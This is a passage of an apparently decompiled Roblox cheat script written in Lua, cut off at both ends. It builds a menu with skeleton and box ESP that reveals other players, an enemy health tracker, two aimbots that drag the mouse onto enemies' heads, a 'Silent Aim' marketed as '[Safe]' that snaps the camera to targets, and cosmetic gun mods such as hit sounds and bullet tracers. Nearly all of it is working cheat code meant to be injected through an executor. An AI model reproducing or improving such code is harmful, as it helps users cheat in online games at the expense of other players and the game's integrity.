            coroutine.wrap(v242)()
        end
        local function v246(p244)
            if p244.Character then
                coroutine.wrap(u243)(p244, p244.Character)
            end

            p244.CharacterAdded:Connect(function(p245)
                coroutine.wrap(u243)(p244, p245)
            end)
        end

        local v247 = _Players2
        local v248, v249, v250 = ipairs(v247:GetPlayers())

        while true do
            local v251

            v250, v251 = v248(v249, v250)

            if v250 == nil then
                break
            end
            if v251 ~= _LocalPlayer3 then
                v246(v251)
            end
        end

        _Players2.PlayerAdded:Connect(v246)

        u167 = true
    end
end

u69.Main:AddSection('Skeleton')

local _espenabled = u69.Main:AddToggle('espenabled', {
    Title = 'Enable ESP',
    Default = esp_settings.enabled,
})
local v254 = _espenabled

_espenabled.OnChanged(v254, function()
    esp_settings.enabled = _espenabled.Value

    if esp_settings.enabled then
        u252()
    else
        local v255, v256, v257 = pairs(u166)

        while true do
            local v258

            v257, v258 = v255(v256, v257)

            if v257 == nil then
                break
            end

            local v259, v260, v261 = pairs(v258.bones)

            while true do
                local v262

                v261, v262 = v259(v260, v261)

                if v261 == nil then
                    break
                end

                v262.Visible = false
            end

            local v263, v264, v265 = pairs(v258.dots)

            while true do
                local v266

                v265, v266 = v263(v264, v265)

                if v265 == nil then
                    break
                end

                v266.Visible = false
            end

            if v258.head_dot then
                v258.head_dot.Visible = false
            end
        end
    end
end)

local _headdot = u69.Main:AddToggle('headdot', {
    Title = 'Enable Head Dot',
    Default = esp_settings.show_head_dot,
})
local v268 = _headdot

_headdot.OnChanged(v268, function()
    esp_settings.show_head_dot = _headdot.Value

    if esp_settings.show_head_dot then
        u252()
    else
        local v269, v270, v271 = pairs(u166)

        while true do
            local v272

            v271, v272 = v269(v270, v271)

            if v271 == nil then
                break
            end

            v272.head_dot.Visible = false
        end
    end
end)
u69.Main:AddDropdown('HeadDotDropdown', {
    Title = 'Head Dot Dropdown',
    Values = {
        'none',
        'fill',
        'holo',
    },
    Multi = false,
    Default = 2,
}):OnChanged(function(p273)
    esp_settings.head_dot_type = p273

    if esp_settings.enabled then
        u252()
    end
end)
u69.Main:AddSection('Box Esp')

local _FullBoxesToggle = u69.Main:AddToggle('FullBoxesToggle', {
    Title = 'Toggle Full Boxes',
    Default = u85.Drawing.Boxes.Full.Enabled,
})
local v275 = _FullBoxesToggle

_FullBoxesToggle.OnChanged(v275, function()
    u85.Drawing.Boxes.Full.Enabled = _FullBoxesToggle.Value
end)

local _FilledBoxesToggle = u69.Main:AddToggle('FilledBoxesToggle', {
    Title = 'Toggle Filled Boxes',
    Default = u85.Drawing.Boxes.Filled.Enabled,
})
local v277 = _FilledBoxesToggle

_FilledBoxesToggle.OnChanged(v277, function()
    if _FilledBoxesToggle.Value then
        u85.Drawing.Boxes.Filled.Transparency = 0.7
    else
        u85.Drawing.Boxes.Filled.Transparency = 1
    end
end)
u69.Main:AddToggle('Rainbowbox', {
    Title = 'Rainbow Box',
    Default = false,
}):OnChanged(function(p278)
    if p278 then
        local _RunService3 = game:GetService('RunService')

        rainbowRunning = true

        _RunService3.Heartbeat:Connect(function()
            if rainbowRunning then
                local v280 = tick() % 5

                getgenv().boxBorderColor = Color3.fromHSV(v280 / 5, 1, 1)
            end
        end)
    else
        rainbowRunning = false
        getgenv().boxBorderColor = Color3.fromRGB(255, 255, 255)
    end
end)
task.spawn(function()
    local _Players3 = game:GetService('Players')
    local _RunService4 = game:GetService('RunService')
    local _TweenService = game:GetService('TweenService')
    local _LocalPlayer4 = _Players3.LocalPlayer
    local _CurrentCamera4 = workspace.CurrentCamera
    local _CoreGui3 = game:GetService('CoreGui')
    local _ScreenGui2 = Instance.new('ScreenGui')

    _ScreenGui2.Parent = _CoreGui3
    _ScreenGui2.Enabled = false

    local _Frame3 = Instance.new('Frame')

    _Frame3.Parent = _ScreenGui2
    _Frame3.Size = UDim2.new(0, 200, 0, 60)
    _Frame3.Position = UDim2.new(0.5, 0, 0.85, 0)
    _Frame3.AnchorPoint = Vector2.new(0.5, 0.5)
    _Frame3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    _Frame3.BackgroundTransparency = 0.4
    _Frame3.BorderSizePixel = 1
    _Frame3.BorderColor3 = Color3.fromRGB(0, 0, 0)

    local _UIStroke2 = Instance.new('UIStroke')

    _UIStroke2.Thickness = 2
    _UIStroke2.Color = Color3.fromRGB(0, 0, 0)
    _UIStroke2.Parent = _Frame3

    local _UICorner2 = Instance.new('UICorner')

    _UICorner2.CornerRadius = UDim.new(0, 15)
    _UICorner2.Parent = _Frame3

    local _ImageLabel2 = Instance.new('ImageLabel')

    _ImageLabel2.Size = UDim2.new(0, 40, 0, 40)
    _ImageLabel2.Position = UDim2.new(0, 3, 0, 10)
    _ImageLabel2.BackgroundTransparency = 1

    local _Frame4 = Instance.new('Frame')

    _Frame4.Parent = _Frame3
    _Frame4.Size = UDim2.new(0, 44, 0, 44)
    _Frame4.Position = UDim2.new(0, 1, 0, 8)
    _Frame4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    _Frame4.BackgroundTransparency = 0.7
    _Frame4.BorderSizePixel = 0

    local _UICorner3 = Instance.new('UICorner')

    _UICorner3.CornerRadius = UDim.new(0, 8)
    _UICorner3.Parent = _Frame4
    _ImageLabel2.Parent = _Frame4

    local _Frame5 = Instance.new('Frame')

    _Frame5.Parent = _ImageLabel2
    _Frame5.Size = UDim2.new(1, 0, 1, 0)
    _Frame5.BackgroundTransparency = 1

    local _TextLabel2 = Instance.new('TextLabel')

    _TextLabel2.Parent = _Frame3
    _TextLabel2.Size = UDim2.new(1, -70, 0.5, 0)
    _TextLabel2.Position = UDim2.new(0, 55, 0, 0)
    _TextLabel2.BackgroundTransparency = 1
    _TextLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
    _TextLabel2.Font = Enum.Font.GothamBold
    _TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
    _TextLabel2.TextSize = 18
    _TextLabel2.TextScaled = false
    _TextLabel2.TextWrapped = true

    local _Frame6 = Instance.new('Frame')

    _Frame6.Parent = _Frame3
    _Frame6.Size = UDim2.new(1, -60, 0, 10)
    _Frame6.Position = UDim2.new(0, 55, 0, 40)
    _Frame6.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    _Frame6.BorderSizePixel = 2
    _Frame6.BorderColor3 = Color3.fromRGB(0, 0, 0)

    local _UICorner4 = Instance.new('UICorner')

    _UICorner4.CornerRadius = UDim.new(0, 3)
    _UICorner4.Parent = _Frame6

    local _Frame7 = Instance.new('Frame')

    _Frame7.Parent = _Frame6
    _Frame7.Size = UDim2.new(0, 0, 1, 0)
    _Frame7.BackgroundTransparency = 0.6
    _Frame7.ZIndex = 1
    _Frame7.BorderSizePixel = 0

    local _Frame8 = Instance.new('Frame')

    _Frame8.Parent = _Frame6
    _Frame8.Size = UDim2.new(0, 0, 1, 0)
    _Frame8.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    _Frame8.BorderSizePixel = 0
    _Frame8.ZIndex = 2

    local _UICorner5 = Instance.new('UICorner')

    _UICorner5.CornerRadius = UDim.new(0, 3)
    _UICorner5.Parent = _Frame8

    local _UICorner6 = Instance.new('UICorner')

    _UICorner6.CornerRadius = UDim.new(0, 3)
    _UICorner6.Parent = _Frame7

    local u302 = nil
    local u303 = nil
    local u304 = false

    local function u317()
        local _huge = math.huge
        local v306 = _Players3
        local v307, v308, v309 = ipairs(v306:GetPlayers())
        local v310 = nil

        while true do
            local v311

            v309, v311 = v307(v308, v309)

            if v309 == nil then
                break
            end
            if v311 ~= _LocalPlayer4 and v311.Character then
                local _Character2 = v311.Character
                local _HumanoidRootPart5 = _Character2:FindFirstChild('HumanoidRootPart')
                local _Humanoid4 = _Character2:FindFirstChild('Humanoid')

                if _HumanoidRootPart5 and _Humanoid4 and (_Humanoid4.Health > 0 and not _HumanoidRootPart5:FindFirstChild('TeammateLabel')) then
                    local _, v315 = _CurrentCamera4:WorldToViewportPoint(_HumanoidRootPart5.Position)

                    if v315 then
                        local _Magnitude2 = (_HumanoidRootPart5.Position - _LocalPlayer4.Character.HumanoidRootPart.Position).Magnitude

                        if _Magnitude2 <= 350 then
                            if _Magnitude2 < _huge then
                                v310 = v311
                                _huge = _Magnitude2
                            end
                        end
                    end
                end
            end
        end

        return v310
    end
    local function v328()
        if u304 and getgenv().state == 2 then
            if _LocalPlayer4.Character and (_LocalPlayer4.Character:FindFirstChild('Humanoid') and _LocalPlayer4.Character.Humanoid.Health > 0) then
                local v318 = u317()

                if v318 then
                    _ScreenGui2.Enabled = true
                    _TextLabel2.Text = v318.DisplayName

                    local v319, v320 = _Players3:GetUserThumbnailAsync(v318.UserId, Enum.ThumbnailType.AvatarBust, Enum.ThumbnailSize.Size150x150)

                    _ImageLabel2.Image = v320 and v319 and v319 or 'rbxassetid://13456566776'

                    local _Humanoid5 = v318.Character:FindFirstChild('Humanoid')

                    if _Humanoid5 then
                        local v322 = _Humanoid5.Health / _Humanoid5.MaxHealth
                        local u323 = UDim2.new(v322, 0, 1, 0)
                        local v324 = Color3.fromRGB(0, 255, 0)

                        if _Humanoid5.Health <= 30 then
                            v324 = Color3.fromRGB(255, 255, 0)
                        end
                        if _Humanoid5.Health <= 15 then
                            v324 = Color3.fromRGB(255, 0, 0)
                        end

                        local v325 = _TweenService:Create(_Frame8, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = u323})
                        local v326 = _TweenService:Create(_Frame8, TweenInfo.new(0.3), {BackgroundColor3 = v324})

                        v325:Play()
                        v326:Play()
                        task.delay(0.8, function()
                            local v327 = {Size = u323}

                            _TweenService:Create(_Frame7, TweenInfo.new(0.3), v327):Play()
                        end)

                        u302 = _Humanoid5.Health
                        u303 = v318
                    end
                else
                    _ScreenGui2.Enabled = false
                    u303 = nil
                end
            else
                _ScreenGui2.Enabled = false
            end
        else
            _ScreenGui2.Enabled = false

            return
        end
    end

    _RunService4.RenderStepped:Connect(v328)
    u69.Settings:AddToggle('targetstat', {
        Title = 'Target status',
        Default = true,
    }):OnChanged(function()
        u304 = _Options.targetstat.Value
    end)
end)

function InitializeAimbot2()
    local u329 = false
    local _MouseButton2 = Enum.UserInputType.MouseButton2
    local u331 = 'Head'
    local u332 = 100
    local u333 = 5
    local u334 = false
    local u335 = false
    local u336 = 0
    local u337 = 0
    local u338 = false
    local u339 = false
    local u340 = nil
    local _RunService5 = game:GetService('RunService')
    local _UserInputService = game:GetService('UserInputService')
    local _Players4 = game:GetService('Players')
    local _LocalPlayer5 = _Players4.LocalPlayer
    local _CurrentCamera5 = workspace.CurrentCamera

    local function u357()
        local v346 = u332
        local v347 = Vector2.new(_CurrentCamera5.ViewportSize.X / 2, _CurrentCamera5.ViewportSize.Y / 2)
        local v348 = _Players4
        local v349, v350, v351 = pairs(v348:GetPlayers())
        local v352 = nil

        while true do
            local v353

            v351, v353 = v349(v350, v351)

            if v351 == nil then
                break
            end
            if v353 ~= _LocalPlayer5 and v353.Character and v353.Character:FindFirstChild(u331) then
                local v354, v355 = _CurrentCamera5:WorldToViewportPoint(v353.Character[u331].Position)

                if v355 then
                    local _Magnitude3 = (Vector2.new(v354.X, v354.Y) - v347).Magnitude

                    if _Magnitude3 < v346 then
                        v352 = v353
                        v346 = _Magnitude3
                    end
                end
            end
        end

        return v352
    end
    local function v368()
        if u329 then
            local _ = getgenv().state == 2

            if _MouseButton2 ~= Enum.UserInputType.MouseButton2 then
                if not _UserInputService:IsKeyDown(_MouseButton2) then
                    u340 = nil

                    return
                end
            elseif not _UserInputService:IsMouseButtonPressed(_MouseButton2) then
                u340 = nil

                return
            end
            if u340 and u338 and u340.Character and u340.Character:FindFirstChild(u331) then
                local v358 = _CurrentCamera5:WorldToViewportPoint(u340.Character[u331].Position)
                local v359 = Vector2.new(v358.X, v358.Y)
                local v360 = Vector2.new(_CurrentCamera5.ViewportSize.X / 2, _CurrentCamera5.ViewportSize.Y / 2)
                local v361 = v359 - v360
                local v362 = Vector2.new(v360.X + v361.X / (u333 + 1), v360.Y + v361.Y / (u333 + 1)) - Vector2.new(_CurrentCamera5.ViewportSize.X / 2, _CurrentCamera5.ViewportSize.Y / 2)

                mousemoverel(v362.X, v362.Y)
            else
                u340 = u357()

                if u340 then
                    local v363 = _CurrentCamera5:WorldToViewportPoint(u340.Character[u331].Position)
                    local v364 = Vector2.new(v363.X, v363.Y)
                    local v365 = Vector2.new(_CurrentCamera5.ViewportSize.X / 2, _CurrentCamera5.ViewportSize.Y / 2)
                    local v366 = v364 - v365
                    local v367 = Vector2.new(v365.X + v366.X / (u333 + 1), v365.Y + v366.Y / (u333 + 1)) - Vector2.new(_CurrentCamera5.ViewportSize.X / 2, _CurrentCamera5.ViewportSize.Y / 2)

                    mousemoverel(v367.X, v367.Y)
                end
            end
        else
            return
        end
    end

    local _Circle2 = Drawing.new('Circle')

    _Circle2.Color = Color3.fromRGB(255, 255, 255)
    _Circle2.Thickness = 1
    _Circle2.Transparency = 1
    _Circle2.Filled = false

    local function v371()
        if u339 then
            local v370 = _UserInputService:GetMouseLocation()

            _Circle2.Radius = u332
            _Circle2.Position = Vector2.new(v370.X, v370.Y)
            _Circle2.Visible = true
        else
            _Circle2.Visible = false
        end
    end

    local v377 = {
        {
            'EnableAimbot2',
            'Enable',
            false,
            function(p372)
                u329 = p372
            end,
        },
        {
            'ShowFOVCheckbox2',
            'Show FOV',
            false,
            function(p373)
                u339 = p373
            end,
        },
        {
            'SmoothnessCheckbox2',
            'Smoothness',
            false,
            function(p374)
                u334 = p374
            end,
        },
        {
            'EnablePrediction2',
            'Enable Prediction',
            false,
            function(p375)
                u335 = p375
            end,
        },
        {
            'StickyAimCheckbox2',
            'Sticky Aim',
            false,
            function(p376)
                u338 = p376
            end,
        },
    }
    local v378, v379, v380 = ipairs(v377)
    local u381 = u333
    local u382 = u332
    local u383 = u331
    local u384 = _MouseButton2

    while true do
        local v385

        v380, v385 = v378(v379, v380)

        if v380 == nil then
            break
        end

        u69.AimTab:AddToggle(v385[1], {
            Title = v385[2],
            Default = v385[3],
        }):OnChanged(v385[4])
    end

    u69.AimTab:AddKeybind('Keybind2', {
        Title = 'Keybind',
        Mode = 'Toggle',
        Default = 'MouseButton2',
        ChangedCallback = function(p386)
            if p386 == Enum.KeyCode.Unknown then
                p386 = Enum.UserInputType.MouseButton2 or p386
            end

            u384 = p386
        end,
    })
    u69.AimTab:AddDropdown('AimPartDropDown2', {
        Title = 'Aim At',
        Values = {
            'Head',
            'UpperTorso',
            'LowerTorso',
        },
        Multi = false,
        Default = 1,
        Callback = function(p387)
            u383 = p387
        end,
    })

    local v392, v393, v394 = ipairs({
        {
            'FOVSizeSlider2',
            'FOV Size',
            100,
            0,
            900,
            0,
            function(p388)
                u382 = p388
            end,
        },
        {
            'SmoothnessSlider2',
            'Smoothness',
            5,
            0,
            20,
            1,
            function(p389)
                u381 = p389
            end,
        },
        {
            'PredictionStrengthXSlider2',
            'Prediction Strength X',
            0,
            0,
            1,
            2,
            function(p390)
                u336 = p390
            end,
        },
        {
            'PredictionStrengthYSlider2',
            'Prediction Strength Y',
            0,
            0,
            1,
            2,
            function(p391)
                u337 = p391
            end,
        },
    })

    while true do
        local v395

        v394, v395 = v392(v393, v394)

        if v394 == nil then
            break
        end

        u69.AimTab:AddSlider(v395[1], {
            Title = v395[2],
            Default = v395[3],
            Min = v395[4],
            Max = v395[5],
            Rounding = v395[6],
            Callback = v395[7],
        })
    end

    _RunService5.RenderStepped:Connect(v368)
    _RunService5.RenderStepped:Connect(v371)
end

InitializeAimbot2()

function InitializeAimbotUI2()
    local v401, v402, v403 = ipairs({
        {
            'EnableAimbot2',
            'Enable Aimbot',
            false,
            function(p396)
                aimbotEnabled2 = p396
            end,
        },
        {
            'ShowFOV2',
            'Show FOV',
            false,
            function(p397)
                showFOV2 = p397
            end,
        },
        {
            'Smoothness2',
            'Smoothness',
            false,
            function(p398)
                aimbotSmoothnessEnabled2 = p398
            end,
        },
        {
            'EnablePrediction2',
            'Enable Prediction',
            false,
            function(p399)
                aimbotPredictionEnabled2 = p399
            end,
        },
        {
            'StickyAim2',
            'Sticky Aim',
            false,
            function(p400)
                aimbotStickyAimEnabled2 = p400
            end,
        },
    })

    while true do
        local v404

        v403, v404 = v401(v402, v403)

        if v403 == nil then
            break
        end

        u69.AimTab:AddToggle(v404[1], {
            Title = v404[2],
            Default = v404[3],
        }):OnChanged(v404[4])
    end

    u69.AimTab:AddKeybind('Keybind2', {
        Title = 'Keybind',
        Mode = 'Toggle',
        Default = 'MouseButton2',
        ChangedCallback = function(p405)
            if p405 == Enum.KeyCode.Unknown then
                p405 = Enum.UserInputType.MouseButton2 or p405
            end

            aimbotKeybind2 = p405
        end,
    })
    u69.AimTab:AddDropdown('AimAtDropdown2', {
        Title = 'Aim focus',
        Values = {
            'Head',
            'UpperTorso',
            'LowerTorso',
        },
        Multi = false,
        Default = 1,
        Callback = function(p406)
            aimbotAimPart2 = p406
        end,
    })

    local v409, v410, v411 = ipairs({
        {
            'FovSizeSlider2',
            'FOV Size',
            100,
            0,
            900,
            0,
            function(p407)
                aimbotFOVSize2 = p407
            end,
        },
        {
            'SmoothnessSlider2',
            'Smoothness',
            5,
            0,
            10,
            1,
            function(p408)
                aimbotSmoothness2 = p408
            end,
        },
    })

    while true do
        local v412

        v411, v412 = v409(v410, v411)

        if v411 == nil then
            break
        end

        u69.AimTab:AddSlider(v412[1], {
            Title = v412[2],
            Default = v412[3],
            Min = v412[4],
            Max = v412[5],
            Rounding = v412[6],
            Callback = v412[7],
        })
    end
end

InitializeAimbotUI2()

local _UserInputService2 = game:GetService('UserInputService')
local _Lighting = game:GetService('Lighting')
local _RunService6 = game:GetService('RunService')
local _Players5 = game:GetService('Players')
local _LocalPlayer6 = _Players5.LocalPlayer

SilentAim = {
    Enabled = false,
    HitChance = 100,
    NotWorkIfFlashed = true,
    MaxDistance = 250,
    TargetPart = 'Head',
}
SilentAimFov = {
    Visible = true,
    Radius = 150,
    Color = Color3.fromRGB(96, 205, 255),
    Circle = nil,
}

function DrawFov()
    if SilentAimFov.Circle then
        SilentAimFov.Circle:Remove()
    end

    local _Circle3 = Drawing.new('Circle')

    _Circle3.Color = SilentAimFov.Color
    _Circle3.Thickness = 0.2
    _Circle3.NumSides = 100
    _Circle3.Radius = SilentAimFov.Radius
    _Circle3.Filled = false
    _Circle3.Transparency = 1
    _Circle3.Visible = SilentAimFov.Visible
    SilentAimFov.Circle = _Circle3
end
function UpdateFov()
    if SilentAimFov.Circle then
        SilentAimFov.Circle.Visible = SilentAimFov.Visible

        local v419 = _UserInputService2

        SilentAimFov.Circle.Position = v419:GetMouseLocation()
    end
end
function GetClosestTargetToMouse()
    local v420 = _UserInputService2:GetMouseLocation()
    local _huge2 = math.huge
    local v422 = _Players5
    local v423, v424, v425 = pairs(v422:GetPlayers())
    local v426 = nil

    while true do
        local v427

        v425, v427 = v423(v424, v425)

        if v425 == nil then
            break
        end
        if v427 ~= _LocalPlayer6 and v427.Character and v427.Character:FindFirstChild('HumanoidRootPart') then
            local _HumanoidRootPart6 = v427.Character:FindFirstChild('HumanoidRootPart')

            if _HumanoidRootPart6 and not _HumanoidRootPart6:FindFirstChild('TeammateLabel') then
                local v429 = v427.Character:FindFirstChild(SilentAim.TargetPart)

                if v429 and (v429.Position - _Workspace.CurrentCamera.CFrame.Position).Magnitude <= SilentAim.MaxDistance then
                    local v430, v431 = _Workspace.CurrentCamera:WorldToViewportPoint(v429.Position)

                    if v431 then
                        local _Magnitude4 = (Vector2.new(v430.X, v430.Y) - v420).Magnitude

                        if _Magnitude4 < SilentAimFov.Radius then
                            if _Magnitude4 < _huge2 then
                                v426 = v429
                                _huge2 = _Magnitude4
                            end
                        end
                    end
                end
            end
        end
    end

    local v433 = _Workspace
    local v434, v435, v436 = pairs(v433:GetChildren())

    while true do
        local v437

        v436, v437 = v434(v435, v436)

        if v436 == nil then
            break
        end
        if v437:IsA('Model') and v437:FindFirstChild('HumanoidRootPart') and v437.Name == 'Target' then
            local v438 = v437:FindFirstChild(SilentAim.TargetPart) or v437:FindFirstChild('HumanoidRootPart')

            if v438 and (v438.Position - _Workspace.CurrentCamera.CFrame.Position).Magnitude <= SilentAim.MaxDistance then
                local v439, v440 = _Workspace.CurrentCamera:WorldToViewportPoint(v438.Position)

                if v440 then
                    local _Magnitude5 = (Vector2.new(v439.X, v439.Y) - v420).Magnitude

                    if _Magnitude5 < SilentAimFov.Radius then
                        if _Magnitude5 < _huge2 then
                            v426 = v438
                            _huge2 = _Magnitude5
                        end
                    end
                end
            end
        end
    end

    return v426
end
function LookAt(p442)
    _Workspace.CurrentCamera.CFrame = CFrame.lookAt(_Workspace.CurrentCamera.CFrame.Position, p442.Position)
end
function SilentAimUIS(p443, p444)
    if not p444 and (SilentAim.Enabled and getgenv().state == 2) and (p443.UserInputType == Enum.UserInputType.MouseButton1 and math.random(0, 100) <= SilentAim.HitChance) then
        local v445 = GetClosestTargetToMouse()

        if v445 ~= nil then
            if SilentAim.NotWorkIfFlashed and _Lighting:FindFirstChild('Flashbang') then
                return
            end

            LookAt(v445)
        end
    end
end

_RunService6.RenderStepped:Connect(function()
    UpdateFov()
end)
_UserInputService2.InputBegan:Connect(SilentAimUIS)
DrawFov()
u69.Silent:AddParagraph({
    Title = 'Please get Szoo client for better experince.',
    Content = ' \u{25cf} Currently Safe to use\n \u{25cf} If not use Szoo autoclicker client then do taptap to connect.',
})

local _SAimtgl = u69.Silent:AddToggle('SAimtgl', {
    Title = 'Silent Aim [V1] [Safe]',
    Description = '\u{fffd}\u{fffd}\u{fffd}\u{fffd}\u{fffd}\u{fffd} Spam click to make it work\n\u{fffd}\u{fffd}\u{fffd}\u{fffd}\u{fffd}\u{fffd} This is safe to use',
    Default = false,
})
local _Fovtgl = u69.Silent:AddToggle('Fovtgl', {
    Title = 'Show FOV',
    Default = false,
})
local v448 = _SAimtgl

_SAimtgl.OnChanged(v448, function()
    if textLabels and textLabels.silentaim then
        textLabels.silentaim.Visible = _Options.SAimtgl.Value
    end

    SilentAim.Enabled = _SAimtgl.Value
end)

local v449 = _Fovtgl

_Fovtgl.OnChanged(v449, function()
    SilentAimFov.Visible = _Fovtgl.Value
end)
u69.Silent:AddSlider('SFovSlider', {
    Title = 'Silent Fov Radius',
    Description = 'Adjust the FOV Radius',
    Default = 150,
    Min = 50,
    Max = 900,
    Rounding = 0,
    Callback = function(p450)
        SilentAimFov.Radius = p450

        if SilentAimFov.Circle then
            SilentAimFov.Circle.Radius = p450
        end
    end,
})
u69.Silent:AddColorpicker('SFovColorpicker', {
    Title = 'Fov Color',
    Default = Color3.fromRGB(96, 205, 255),
}):OnChanged(function(p451)
    SilentAimFov.Color = p451

    if SilentAimFov.Circle then
        SilentAimFov.Circle.Color = p451
    end
end)
u69.Silent:AddDropdown('TargetpartDropdown', {
    Title = 'Target Dropdown',
    Description = 'What will be targeted?',
    Values = {
        'Legit',
        'Head',
        'UpperTorso',
        'LowerTorso',
    },
    Multi = false,
    Default = 1,
}):OnChanged(function(p452)
    if p452 == 'Legit' then
        SilentAim.TargetPart = math.random(1, 2) == 1 and 'Head' or 'UpperTorso'
    else
        SilentAim.TargetPart = p452
    end
end)

function a4()
    u69.Gunmod:AddSection('Custom Hit Sound')
    u69.Gunmod:AddSection('HeadShot Sound')

    local u453 = {
        Neverlose = 'rbxassetid://8726881116',
        Gamesense = 'rbxassetid://4817809188',
        One = 'rbxassetid://7380502345',
        Bell = 'rbxassetid://6534947240',
        Rust = 'rbxassetid://1255040462',
        TF2 = 'rbxassetid://2868331684',
        Slime = 'rbxassetid://6916371803',
        ['Among Us'] = 'rbxassetid://5700183626',
        Minecraft = 'rbxassetid://4018616850',
        ['CS:GO'] = 'rbxassetid://6937353691',
        Saber = 'rbxassetid://8415678813',
        Baimware = 'rbxassetid://3124331820',
        Osu = 'rbxassetid://7149255551',
        ['TF2 Critical'] = 'rbxassetid://296102734',
        Bat = 'rbxassetid://3333907347',
        Bubble = 'rbxassetid://6534947588',
        Pick = 'rbxassetid://1347140027',
        Pop = 'rbxassetid://198598793',
        Bruh = 'rbxassetid://4275842574',
        Bamboo = 'rbxassetid://3769434519',
        Crowbar = 'rbxassetid://546410481',
        Weeb = 'rbxassetid://6442965016',
        Beep = 'rbxassetid://8177256015',
        Bambi = 'rbxassetid://8437203821',
        Stone = 'rbxassetid://3581383408',
        ['Old Fatality'] = 'rbxassetid://6607142036',
        Click = 'rbxassetid://8053704437',
        Ding = 'rbxassetid://7149516994',
        Snow = 'rbxassetid://6455527632',
        Laser = 'rbxassetid://7837461331',
        Mario = 'rbxassetid://2815207981',
        Steve = 'rbxassetid://4965083997',
    }
    local v454, v455, v456 = pairs(u453)
    local u457 = {}
    local v458 = 'rbxassetid://16537337310'
    local v459 = 'rbxassetid://9119561046'
    local v460 = 'rbxassetid://13110130082'
    local v461 = 'rbxassetid://8726881116'

    while true do
        local v462

        v456, v462 = v454(v455, v456)

        if v456 == nil then
            break
        end

        table.insert(u457, v456)
    end

    local function v479(p463, p464, p465, p466, p467)
        u69.Gunmod:AddDropdown(p464, {
            Title = 'Choose Hit Sound',
            Values = u457,
            Multi = false,
            Default = 1,
        }):OnChanged(function(p468)
            p466[1] = u453[p468] or p466[1]
        end)

        local u469 = nil

        u69.Gunmod:AddToggle(p463, {
            Title = p467,
            Default = false,
        }):OnChanged(function(p470)
            if u469 then
                u469:Disconnect()
            end
            if p470 then
                local _ClientViewModel = game:GetService('Players').LocalPlayer:WaitForChild('PlayerScripts'):WaitForChild('Modules'):WaitForChild('ClientReplicatedClasses'):WaitForChild('ClientFighter'):WaitForChild('ClientItem'):WaitForChild('ClientViewModel')

                local function v474(p472)
                    if p472:IsA('Sound') and p472.SoundId == p465 then
                        p472:Stop()

                        local _Sound = Instance.new('Sound', p472.Parent)

                        _Sound.SoundId = p466[1]

                        _Sound:Play()
                        _Sound.Ended:Wait()
                        _Sound:Destroy()
                    end
                end

                u469 = _ClientViewModel.ChildAdded:Connect(v474)

                local v475, v476, v477 = pairs(_ClientViewModel:GetChildren())

                while true do
                    local v478

                    v477, v478 = v475(v476, v477)

                    if v477 == nil then
                        break
                    end

                    v474(v478)
                end
            end
        end)
    end

    v479('CSP1', 'SoundSelector1', v458, {v459}, 'Headshot sound')
    u69.Gunmod:AddSection('Bodyshot Sound')
    v479('CSP2', 'SoundSelector2', v460, {v461}, 'Bodyshot sound')

    local u480 = {
        aLqz = false,
        eJdF = Color3.fromRGB(255, 255, 255),
        rQdT = 1.5,
        pJwT = 2,
    }
    local u481 = {
        ['Lightning Bolt'] = 'rbxassetid://12781806168',
        ['Lightning Bolt2'] = 'rbxassetid://7151778302',
        Laser = 'rbxassetid://5864341017',
        ['Red Laser'] = 'rbxassetid://6333823534',
        DNA = 'rbxassetid://6511613786',
    }
    local u482 = 'Lightning Bolt'
    local u483 = {
        'rbxassetid://13110197302',
        'rbxassetid://13270206087',
        'rbxassetid://100354903585817',
        'rbxassetid://96886470957330',
        'rbxassetid://120386834342865',
        'rbxasset://sounds//paintball.wav',
        'rbxassetid://82715240396507',
        'rbxassetid://17266070755',
        'rbxassetid://16526184730',
        'rbxassetid://14417089152',
        'rbxassetid://14417089307',
        'rbxassetid://16526184479',
        'rbxassetid://16397424081',
        'rbxassetid://13087362838',
        'rbxassetid://101759165907297',
        'rbxassetid://76357741438822',
    }
    local _Players6 = game:GetService('Players')
    local _LocalPlayer7 = _Players6.LocalPlayer
    local v486 = _LocalPlayer7
    local u487 = _LocalPlayer7.GetMouse(v486)

    local function u494(p488, p489)
        if u480.aLqz then
            task.spawn(function()
                local _Part = Instance.new('Part')

                _Part.Name = 'BulletTracerPart'
                _Part.CanCollide = false
                _Part.Anchored = true
                _Part.Transparency = 1
                _Part.Parent = workspace

                local _Attachment = Instance.new('Attachment', _Part)

                _Attachment.Position = p488.Position

                local _Attachment2 = Instance.new('Attachment', _Part)

                _Attachment2.Position = p489

                local _Beam = Instance.new('Beam', _Part)

                _Beam.Attachment0 = _Attachment
                _Beam.Attachment1 = _Attachment2
                _Beam.TextureSpeed = 2
                _Beam.Color = ColorSequence.new(u480.eJdF)
                _Beam.Width0 = u480.pJwT
                _Beam.Width1 = u480.pJwT
                _Beam.Texture = u481[u482]

                wait(u480.rQdT)
                _Part:Destroy()
            end)
        end
    end
    local function u501(p495)
        if p495 and p495:IsA('Sound') then
            local v496, v497, v498 = ipairs(u483)

            while true do
                local v499

                v498, v499 = v496(v497, v498)

                if v498 == nil then
                    break
                end
                if p495.SoundId == v499 then
                    local _Character3 = _LocalPlayer7.Character

                    if _Character3 then
                        _Character3 = _LocalPlayer7.Character:FindFirstChild('HumanoidRootPart')
                    end
                    if _Character3 then
                        u494(_Character3, u487.Hit.Position)
                    end

                    break
                end
            end
        end
    end

    u69.Gunmod:AddSection('Bullet Trails')

    local _btrc = u69.Gunmod:AddToggle('btrc', {
        Title = 'Bullet Tracer',
        Default = false,
    })
    local v503 = _btrc

    _btrc.OnChanged(v503, function()
        u480.aLqz = _btrc.Value
    end)
    u69.Gunmod:AddDropdown('BTDropdown', {
        Title = 'Style Dropdown',
        Values = {
            'Lightning Bolt',
            'Lightning Bolt2',
            'Laser',
            'Red Laser',
            'DNA',
        },
        Multi = false,
        Default = 4,
    }):OnChanged(function(p504)
        u482 = p504
    end)
    u69.Gunmod:AddSlider('BTL', {
        Title = 'BulletTracerLifetime',
        Default = 1.5,
        Min = 0,
        Max = 20,
        Rounding = 0.1,
    }):OnChanged(function(p505)
        u480.rQdT = p505
    end)
    u69.Gunmod:AddSlider('BTT', {
        Title = 'BulletTracerThickness',
        Default = 2,
        Min = 0,
        Max = 20,
        Rounding = 0.1,
